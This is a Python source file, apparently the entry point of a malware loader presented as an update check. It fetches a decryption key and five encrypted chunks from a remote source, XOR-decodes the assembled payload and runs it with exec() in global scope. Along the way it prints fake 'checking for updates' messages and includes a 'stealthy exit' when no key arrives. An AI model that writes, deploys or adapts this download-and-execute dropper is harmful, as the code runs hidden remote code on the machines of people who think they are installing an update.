import time
import ctypes
import sys
from .downloader import Downloader
from .decoder import Decoder

def main():
    downloader = Downloader()
    
    print("[*] Checking for updates...")
    # 1. Authenticate / Get Key
    xor_key = downloader.get_decryption_key()
    if not xor_key:
        print("[-] System up to date. (No key found)") # Stealthy exit
        return

    print(f"[+] Key received: {xor_key}")

    # 2. Download Chunks
    chunks = []
    print("[*] Downloading package...")
    
    # We attempt to download chunks 0-4
    for i in range(5):
        print(f"    - Fetching chunk {i}...")
        chunk_data = downloader.fetch_chunk(str(i))
        if chunk_data:
            chunks.append(chunk_data)
        else:
            print(f"[-] Package incomplete. Failed at chunk {i}.")
            return

    # 3. Assemble
    full_encrypted = "".join(chunks) # Assuming chunks are strictly ordered 0-4
    print(f"[+] Encrypted payload assembled. Length: {len(full_encrypted)}")
    
    # 4. Decode
    custom_seed = "STATIC_SEED" 
    
    print("[*] Decrypting...")
    try:
        payload_bytes = Decoder.decode_pipeline(full_encrypted, xor_key, custom_seed)
    except Exception as e:
        print(f"[-] Decryption error: {e}")
        return
    
    if payload_bytes:
        print("[+] Payload decrypted successfully!")
        print(f"[+] Payload Size: {len(payload_bytes)} bytes")
        
        print("[*] Executing Payload...")
        try:
            # Decode as utf-8 and execute as python
            payload_str = payload_bytes.decode('utf-8')
            # Execute in global scope
            exec(payload_str, globals())
        except Exception as e:
            print(f"[-] Execution failed: {e}")
    else:
        print("[-] Decryption returned empty payload.")

if __name__ == "__main__":
    main()
